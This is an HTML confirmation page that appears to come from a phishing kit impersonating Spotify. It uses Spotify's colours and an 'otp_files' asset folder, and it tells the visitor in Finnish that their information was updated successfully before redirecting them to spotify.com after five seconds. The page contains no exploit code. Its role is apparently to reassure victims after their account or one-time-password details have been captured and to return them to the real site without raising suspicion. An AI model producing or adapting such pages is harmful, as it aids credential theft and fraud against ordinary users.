
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thanks</title>
    <meta name="theme-color" content="#478ac9">
    <meta property="og:title" content="Thanks">
    <meta property="og:type" content="website">
    <link rel="stylesheet" href="./otp_files/main.css">
    <link rel="stylesheet" href="./otp_files/otp.css">
    
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #1DB954, #191414);
            font-family: "Arial", sans-serif;
            color: white;
            text-align: center;
            animation: fadeIn 1s ease-in-out;
        }

        .container {
            background: rgba(0, 0, 0, 0.85);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 90%;
            animation: scaleIn 0.5s ease-in-out;
        }

        .container img {
            width: 80px;
            margin-bottom: 15px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }

        p {
            font-size: 16px;
            color: #ccc;
        }

        .loading-bar {
            width: 100%;
            height: 5px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50px;
            margin-top: 20px;
            position: relative;
            overflow: hidden;
        }

        .loading-bar::after {
            content: "";
            display: block;
            width: 0%;
            height: 100%;
            background: #1DB954;
            position: absolute;
            left: 0;
            top: 0;
            animation: loading 5s linear forwards;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes scaleIn {
            from { transform: scale(0.9); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        @keyframes loading {
            from { width: 0%; }
            to { width: 100%; }
        }
    </style>

    <script>
        setTimeout(function() {
            window.location.href = "https://www.spotify.com/";
        }, 5000); // Redirect after 5 seconds
    </script>
</head>
<body>

<div class="container">
    <img src="./otp_files/green.svg" alt="Onnistui">
    <h1>Kiitos!</h1>
    <p>Tietosi on päivitetty onnistuneesti.</p>
    <p>Sinut ohjataan viralliselle sivustolle muutaman sekunnin kuluttua...</p>
    <div class="loading-bar"></div>
</div>

</div>


</body>
</html>
